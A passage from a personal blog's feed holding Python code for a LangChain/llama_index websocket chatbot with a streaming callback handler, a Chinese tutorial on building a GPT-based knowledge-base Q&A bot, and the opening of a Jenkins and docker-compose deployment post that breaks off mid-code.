index_configs=[tool],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    agent_chain = create_llama_chat_agent(</span><br><span class="line">        toolkit,</span><br><span class="line">        llm,</span><br><span class="line">        memory=memory,</span><br><span class="line">        verbose=<span class="literal">True</span>  </span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> agent_chain</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_message</span>(<span class="params">websocket, message_queue</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        </span><br><span class="line">        message = <span class="keyword">await</span> message_queue.get()</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">        <span class="keyword">await</span> websocket.send(message)</span><br><span class="line">        <span class="comment"># print(&#x27;Sent message: %s&#x27; % message)</span></span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">        message_queue.task_done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">receive_messages</span>(<span class="params">websocket,message_queue,params_json</span>):</span></span><br><span class="line">    <span class="comment"># data path</span></span><br><span class="line">    direct_path = params_json[<span class="string">&#x27;input_dir&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    project_id=params_json[<span class="string">&quot;project_id&quot;</span>]</span><br><span class="line">    session_id = params_json[<span class="string">&quot;session_id&quot;</span>]</span><br><span class="line"></span><br><span class="line">    connecte_session[<span class="built_in">hash</span>(websocket)]=session_id</span><br><span class="line">    </span><br><span class="line">    chat_agent = build_llama_chat_agent(direct_path,project_id,session_id,<span class="literal">None</span>,<span class="literal">None</span>)</span><br><span class="line">    print(chat_agent.memory.chat_memory.messages)</span><br><span class="line">    query = params_json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;question&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">            response_stream = <span class="keyword">await</span> chat_agent.arun(</span><br><span class="line">                query,</span><br><span class="line">                callbacks=[CustomAsyncCallBackHandler(message_queue)]</span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            logging.info(<span class="string">&#x27;ai response：&#x27;</span>+response_stream)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">            response_stream = <span class="built_in">str</span>(e)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response_stream.startswith(<span class="string">&quot;Could not parse LLM output: `&quot;</span>):</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line">            response_stream = response_stream.removeprefix(<span class="string">&quot;Could not parse LLM output: `&quot;</span>).removesuffix(<span class="string">&quot;`&quot;</span>)</span><br><span class="line">            logging.error(<span class="string">&quot;error ：&quot;</span>+response_stream)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">websocket_server</span>(<span class="params">websocket, path</span>):</span></span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    print(<span class="string">&#x27;Client connected.&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        message_queue = asyncio.Queue()</span><br><span class="line"></span><br><span class="line">        send_task = asyncio.create_task(send_message(websocket, message_queue))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">for</span> message <span class="keyword">in</span> websocket:</span><br><span class="line">            print(<span class="string">&#x27;Received message: %s&#x27;</span> % message)</span><br><span class="line">            data = json.loads(message)</span><br><span class="line">            <span class="keyword">await</span> receive_messages(websocket,message_queue,data)</span><br><span class="line">    <span class="keyword">except</span> websockets.exceptions.ConnectionClosed:</span><br><span class="line">        <span class="comment">#get session_id</span></span><br><span class="line">        session_id = connecte_session[<span class="built_in">hash</span>(websocket)]</span><br><span class="line">        <span class="comment">#delete cache by session_id</span></span><br><span class="line">        <span class="keyword">del</span> agent_cache[session_id]</span><br><span class="line">        print(<span class="string">&#x27;Client : %s disconnected.&#x27;</span> % session_id)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> websocket.close()</span><br><span class="line">        <span class="comment">#connected.remove(websocket)</span></span><br><span class="line">        send_task.cancel()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(send_task, return_exceptions=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    start_server = websockets.serve(websocket_server, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9961</span>)</span><br><span class="line">    print(<span class="string">&#x27;websocket_server now started listening on port: 9961&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    asyncio.get_event_loop().run_until_complete(start_server)</span><br><span class="line">    asyncio.get_event_loop().run_forever()</span><br></pre></td></tr></table></figure><h3><span id="custom-callback-handlerpy">custom callback handler.py</span></h3><p>Return AI’s response to the WebSocket client</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Any, Union</span><br><span class="line"><span class="keyword">from</span> asyncio.queues <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">from</span> langchain.callbacks.base <span class="keyword">import</span> AsyncCallbackHandler</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Any, Dict, List, Optional</span><br><span class="line"><span class="keyword">from</span> langchain.schema <span class="keyword">import</span> LLMResult</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> langchain.callbacks.streaming_stdout_final_only <span class="keyword">import</span> FinalStreamingStdOutCallbackHandler</span><br><span class="line"><span class="comment">#split AI&#x27;s response,only need the final Answers</span></span><br><span class="line">DEFAULT_ANSWER_PREFIX_TOKENS = [<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;AI&quot;</span>, <span class="string">&quot;:&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomAsyncCallBackHandler</span>(<span class="params">AsyncCallbackHandler</span>):</span></span><br><span class="line">    queue: Queue</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,queue:Queue, answer_prefix_tokens: Optional[List[<span class="built_in">str</span>]] = <span class="literal">None</span></span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="keyword">if</span> answer_prefix_tokens <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            answer_prefix_tokens = DEFAULT_ANSWER_PREFIX_TOKENS</span><br><span class="line">        self.answer_prefix_tokens = answer_prefix_tokens</span><br><span class="line">        self.last_tokens = [<span class="string">&quot;&quot;</span>] * <span class="built_in">len</span>(answer_prefix_tokens)</span><br><span class="line">        self.answer_reached = <span class="literal">False</span></span><br><span class="line">        self.queue=queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">put_message</span>(<span class="params">self,json_str</span>):</span></span><br><span class="line">        <span class="keyword">await</span> self.queue.put(json.dumps(json_str))</span><br><span class="line">        <span class="keyword">await</span> self.queue.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">on_llm_start</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        self, serialized: Dict[<span class="built_in">str</span>, Any], prompts: List[<span class="built_in">str</span>], **kwargs: Any</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Run when LLM starts running.&quot;&quot;&quot;</span></span><br><span class="line">        self.answer_reached = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">on_llm_new_token</span>(<span class="params">self, token: <span class="built_in">str</span>, **kwargs</span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">         <span class="comment"># Remember the last n tokens, where n = len(answer_prefix_tokens)</span></span><br><span class="line">        self.last_tokens.append(token)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.last_tokens) &gt; <span class="built_in">len</span>(self.answer_prefix_tokens):</span><br><span class="line">            self.last_tokens.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check if the last n tokens match the answer_prefix_tokens list ...</span></span><br><span class="line">        <span class="keyword">if</span> self.last_tokens == self.answer_prefix_tokens:</span><br><span class="line">            self.answer_reached = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># Do not print the last token in answer_prefix_tokens,</span></span><br><span class="line">            <span class="comment"># as it&#x27;s not part of the answer yet</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ... if yes, then print tokens from now on</span></span><br><span class="line">        <span class="keyword">if</span> self.answer_reached:</span><br><span class="line">            response = <span class="built_in">str</span>(token)</span><br><span class="line">            <span class="keyword">await</span> self.put_message(response)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">on_llm_end</span>(<span class="params">self, response: LLMResult, **kwargs: Any</span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Run when LLM ends running.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.answer_reached:</span><br><span class="line">            response = <span class="string">&quot;[DONE]&quot;</span></span><br><span class="line">            <span class="keyword">await</span> self.put_message(response)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">on_llm_error</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        self, error: Union[Exception, KeyboardInterrupt], **kwargs: Any</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Run when LLM errors.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Based&quot;&gt;&lt;a href=&quot;#Based&quot; class=&quot;headerlink&quot; title=&quot;Based&quot;&gt;&lt;/a&gt;Based&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Langchain&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;llama_index &amp;gt;=0.6.5&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;GPT-3.5&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;websockets&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;python &amp;gt;=3.10&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;dependence&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install llama-index&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install openai &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install langchain&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install websockets&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install pandas&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install llama-hub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h1 id=&quot;What-use&quot;&gt;&lt;a href=&quot;#What-use&quot; class=&quot;headerlink&quot; title=&quot;What use&quot;&gt;&lt;/a&gt;What use&lt;/h1&gt;&lt;p&gt;Supporting private knowledge base AI question-answering chatbot, capable of both knowledge-based Q&amp;amp;A and casual conversation.&lt;/p&gt;</summary>
    
    
    
    <category term="AI" scheme="https://reiner.host/categories/AI/"/>
    
    
    <category term="AI" scheme="https://reiner.host/tags/AI/"/>
    
    <category term="ChatGPT" scheme="https://reiner.host/tags/ChatGPT/"/>
    
    <category term="AI智能客服" scheme="https://reiner.host/tags/AI%E6%99%BA%E8%83%BD%E5%AE%A2%E6%9C%8D/"/>
    
  </entry>
  
  <entry>
    <title>使用llama_index实现chatGPT智能问答机器人</title>
    <link href="https://reiner.host/posts/8f0289a0.html"/>
    <id>https://reiner.host/posts/8f0289a0.html</id>
    <published>2023-05-14T12:04:22.000Z</published>
    <updated>2023-06-14T14:49:42.342Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="前言">前言</span></h1><p>  随着OPENAI开放API接口后，各大厂商的AI如雨后春笋般涌现，如同十年前的互联网大火，未来的风口必然是在AI上。</p><p>当然，基于自训模型/自研AI 门槛过高，不是个人或中小厂能干的，而且即使有也与OPENAI差距不小，因此一般人能卷的也只有应用层了。</p><p>基于此背景，我开始研究基于GPT的自定义数据索引问答机器人，接着我发现了llama_index和langchain这两个框架，在此记录一下它的使用方法。</p><p>llama_index: <a href="https://github.com/jerryjliu/llama_index">GitHub - jerryjliu/llama_index: LlamaIndex (GPT Index) is a project that provides a central interface to connect your LLM&#39;s with external data.</a></p><p>langchain: <a href="https://github.com/hwchase17/langchain">GitHub - hwchase17/langchain: ⚡ Building applications with LLMs through composability ⚡</a></p><h1><span id="openai模型微调">OPENAI模型微调？</span></h1><p>最初我尝试使用OPENAI的模型微调，我试着弄了几百KB的文本数据喂进去，然而发现当我使用微调模型对话时AI的回复总是只言片语连一句完整的句子都无法返回。</p><p>通过搜索资料后我意识到模型微调不是几百或者几兆文本数据就能达到我想要的目地的。</p><p>最终我发现llama_index + langchain可以实现想要的效果</p><h1><span id="llama_index-langchian实现智能问答机器人">llama_index + langchian实现智能问答机器人</span></h1><h2><span id="step-1安装环境">step 1.安装环境</span></h2><ul><li><p>安装python3.10以上版本</p></li><li><p>安装依赖库：</p><ol><li><p>pip install llama-index</p></li><li><p>pip install openai</p></li><li><p>pip install langchain</p></li><li><p>pip install pandas</p></li></ol></li><li><p>准备OPENAI的API KEY</p></li></ul><h3><span id="step-2准备数据">step 2.准备数据</span></h3><p>  准备好机器人要回答的资料库，可以有PDF、HTML、WORD文档、SQL、API接口甚至GITHUB、WIKI等网络资源也可以，在本章我将使用简单的TXT文本，举例大概内容如下：</p><p>塞尔达传说：王国之泪什么时候出？      《塞尔达传说：王国之泪》将于2023年5月12日发售哦，敬请期待！ </p><span id="more"></span><h3><span id="step-3编写python代码">step 3.编写python代码</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> llama_index <span class="keyword">import</span> SimpleDirectoryReader, ServiceContext, GPTVectorStoreIndex, PromptHelper,load_index_from_storage,StorageContext</span><br><span class="line"><span class="keyword">from</span> llama_index.llm_predictor.chatgpt <span class="keyword">import</span> ChatGPTLLMPredictor</span><br><span class="line"><span class="keyword">from</span> langchain.chat_models <span class="keyword">import</span> ChatOpenAI</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> langchain.callbacks.streaming_stdout <span class="keyword">import</span> StreamingStdOutCallbackHandler</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置你的OPENAI KEY</span></span><br><span class="line">os.environ[<span class="string">&quot;OPENAI_API_KEY&quot;</span>] = <span class="string">&#x27;sk-xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_index</span>(<span class="params">directory_path</span>):</span></span><br><span class="line">    <span class="comment"># set maximum input size</span></span><br><span class="line">    max_input_size = <span class="number">4096</span></span><br><span class="line">    <span class="comment"># set number of output tokens</span></span><br><span class="line">    num_outputs = <span class="number">2000</span></span><br><span class="line">    <span class="comment"># set maximum chunk overlap</span></span><br><span class="line">    max_chunk_overlap = <span class="number">20</span></span><br><span class="line">    <span class="comment"># set chunk size limit</span></span><br><span class="line">    chunk_size_limit = <span class="number">600</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment">#如果需要流式输出，设置streaming=Ture</span></span><br><span class="line">     <span class="comment"># define LLM</span></span><br><span class="line">    llm_predictor = ChatGPTLLMPredictor(llm=ChatOpenAI(temperature=<span class="number">0.5</span>, model_name=<span class="string">&quot;gpt-3.5-turbo&quot;</span>, streaming=<span class="literal">False</span>))</span><br><span class="line">    prompt_helper = PromptHelper(max_input_size, num_outputs, max_chunk_overlap, chunk_size_limit=chunk_size_limit)</span><br><span class="line">    <span class="comment">#读取资料</span></span><br><span class="line">    documents = SimpleDirectoryReader(directory_path).load_data()</span><br><span class="line">    service_context = ServiceContext.from_defaults(llm_predictor=llm_predictor, prompt_helper=prompt_helper)</span><br><span class="line">    index = GPTVectorStoreIndex.from_documents(documents,service_context=service_context)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#保存资料上下文到磁盘,默认./storage</span></span><br><span class="line">    index.storage_context.persist(<span class="string">&#x27;D://cache/storage&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> service_context</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ask</span>(<span class="params">service_context</span>):</span></span><br><span class="line">    storage_context = StorageContext.from_defaults(persist_dir=<span class="string">&#x27;D://cache/storage&#x27;</span>)</span><br><span class="line">    index = load_index_from_storage(storage_context)</span><br><span class="line">    query_engine=index.as_query_engine(</span><br><span class="line">                response_mode=<span class="string">&quot;compact&quot;</span>,</span><br><span class="line">                streaming=<span class="literal">False</span>,</span><br><span class="line">                similarity_top_k=<span class="number">1</span>,service_context=service_context)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">        query = <span class="built_in">input</span>(<span class="string">&quot;你想问什么? &quot;</span>)</span><br><span class="line">        response = query_engine.query(query)</span><br><span class="line">        print(response)</span><br><span class="line">        <span class="comment">#流式输出使用此方法打印</span></span><br><span class="line">        <span class="comment">#response.print_response_stream()</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#该路径为资料库路径，如D://data/data.txt</span></span><br><span class="line">service_context=init_index(<span class="string">&#x27;D://data&#x27;</span>)</span><br><span class="line">ask(service_context)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="final-step运行py文件">final step.运行py文件</span></h3><p>运行python代码看看是否能正常回答资料库中问题</p><p><strong>后续可优化的点：</strong></p><ul><li><p>使用websocket + 流试输出实现类似打字机的效果，流式输出反应较快用户体验较好</p></li><li><p>记录下用户的历史对话上下文</p></li><li><p>集成资料库问答+聊天为一体的机器人，自动识别属于资料问答还是普通聊天</p></li></ul><h1><span id="推荐gpt相关项目">推荐GPT相关项目</span></h1><p>AutoGPT:<a href="https://github.com/Significant-Gravitas/Auto-GPT">GitHub - Significant-Gravitas/Auto-GPT: An experimental open-source attempt to make GPT-4 fully autonomous.</a></p><p>GPT4-FREE:<a href="https://github.com/xtekky/gpt4free">GitHub - xtekky/gpt4free: decentralising the Ai Industry, just some language model api&#39;s…</a></p><p>OPENAI-JAVA:<a href="https://github.com/TheoKanning/openai-java">GitHub - TheoKanning/openai-java: OpenAI GPT-3 Api Client in Java</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;  随着OPENAI开放API接口后，各大厂商的AI如雨后春笋般涌现，如同十年前的互联网大火，未来的风口必然是在AI上。&lt;/p&gt;
&lt;p&gt;当然，基于自训模型/自研AI 门槛过高，不是个人或中小厂能干的，而且即使有也与OPENAI差距不小，因此一般人能卷的也只有应用层了。&lt;/p&gt;
&lt;p&gt;基于此背景，我开始研究基于GPT的自定义数据索引问答机器人，接着我发现了llama_index和langchain这两个框架，在此记录一下它的使用方法。&lt;/p&gt;
&lt;p&gt;llama_index: &lt;a href=&quot;https://github.com/jerryjliu/llama_index&quot;&gt;GitHub - jerryjliu/llama_index: LlamaIndex (GPT Index) is a project that provides a central interface to connect your LLM&amp;#39;s with external data.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;langchain: &lt;a href=&quot;https://github.com/hwchase17/langchain&quot;&gt;GitHub - hwchase17/langchain: ⚡ Building applications with LLMs through composability ⚡&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;OPENAI模型微调？&quot;&gt;&lt;a href=&quot;#OPENAI模型微调？&quot; class=&quot;headerlink&quot; title=&quot;OPENAI模型微调？&quot;&gt;&lt;/a&gt;OPENAI模型微调？&lt;/h1&gt;&lt;p&gt;最初我尝试使用OPENAI的模型微调，我试着弄了几百KB的文本数据喂进去，然而发现当我使用微调模型对话时AI的回复总是只言片语连一句完整的句子都无法返回。&lt;/p&gt;
&lt;p&gt;通过搜索资料后我意识到模型微调不是几百或者几兆文本数据就能达到我想要的目地的。&lt;/p&gt;
&lt;p&gt;最终我发现llama_index + langchain可以实现想要的效果&lt;/p&gt;
&lt;h1 id=&quot;llama-index-langchian实现智能问答机器人&quot;&gt;&lt;a href=&quot;#llama-index-langchian实现智能问答机器人&quot; class=&quot;headerlink&quot; title=&quot;llama_index + langchian实现智能问答机器人&quot;&gt;&lt;/a&gt;llama_index + langchian实现智能问答机器人&lt;/h1&gt;&lt;h2 id=&quot;step-1-安装环境&quot;&gt;&lt;a href=&quot;#step-1-安装环境&quot; class=&quot;headerlink&quot; title=&quot;step 1.安装环境&quot;&gt;&lt;/a&gt;step 1.安装环境&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;安装python3.10以上版本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;安装依赖库：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;pip install llama-index&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;pip install openai&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;pip install langchain&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;pip install pandas&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;准备OPENAI的API KEY&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;step-2-准备数据&quot;&gt;&lt;a href=&quot;#step-2-准备数据&quot; class=&quot;headerlink&quot; title=&quot;step 2.准备数据&quot;&gt;&lt;/a&gt;step 2.准备数据&lt;/h3&gt;&lt;p&gt;  准备好机器人要回答的资料库，可以有PDF、HTML、WORD文档、SQL、API接口甚至GITHUB、WIKI等网络资源也可以，在本章我将使用简单的TXT文本，举例大概内容如下：&lt;/p&gt;
&lt;p&gt;塞尔达传说：王国之泪什么时候出？      《塞尔达传说：王国之泪》将于2023年5月12日发售哦，敬请期待！ &lt;/p&gt;</summary>
    
    
    
    <category term="AI" scheme="https://reiner.host/categories/AI/"/>
    
    
    <category term="-- AI -- ChatGPT -- 对话机器人 " scheme="https://reiner.host/tags/AI-ChatGPT-%E5%AF%B9%E8%AF%9D%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
  </entry>
  
  <entry>
    <title>使用jenkins+docker-compose实现springboot与vue3项目自动化部署</title>
    <link href="https://reiner.host/posts/12ac9414.html"/>
    <id>https://reiner.host/posts/12ac9414.html</id>
    <published>2023-03-09T12:03:57.000Z</published>
    <updated>2023-03-09T12:11:03.932Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="前言">前言</span></h1><p>前面使用Jenkins+docker+shell脚本可以方便的实现单体应用部署，但如果是微服务架构，工程包较多，若是为每一个服务都建一个Jenkins job 会变得很繁琐，这个时候就需要用到docker-compose 容器编排工具，它可以只需一行命令就能帮我们完成多个服务的构建、推送、重启。</p><p>  考虑到如果有多个服务需要部署到多台服务器，如果每台服务器都采用发送jar包再构建镜像的方式会产生许多重复工作，因此这种情况应该使用jenkins构建镜像-&gt;推送到私库-&gt;服务器拉取-&gt;docker-compose启动 如此流程来完成部署。</p><h1><span id="准备工作">准备工作</span></h1><p>需要安装如下软件：</p><ol><li><p>Jenkins （包括git/svn、publish over ssh 这个插件，jenkins安装教程很多此处不再赘述）</p></li><li><p>docker </p></li><li><p>Node JS (可选，仅部署前端vue项目时需要安装)</p></li><li><p>docker compose </p></li></ol><p><strong>准备工作指路：</strong></p><p>jenkins:  <a href="https://www.jenkins.io/download/">https://www.jenkins.io/download/</a>  直接启动war包或者使用docker安装</p><p>docker: <a href="https://docs.docker.com/desktop/install/linux-install/">Install Docker Desktop on Linux</a>  </p><p>Node Js:<a href="https://nodejs.org/en/">Node.js</a> </p><p>docker compose:  <a href="https://github.com/docker/compose">GitHub - docker/compose: Define and run multi-container applications with Docker</a>  </p><p>或者直接使用curl下载安装，以CentOs为例执行如下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 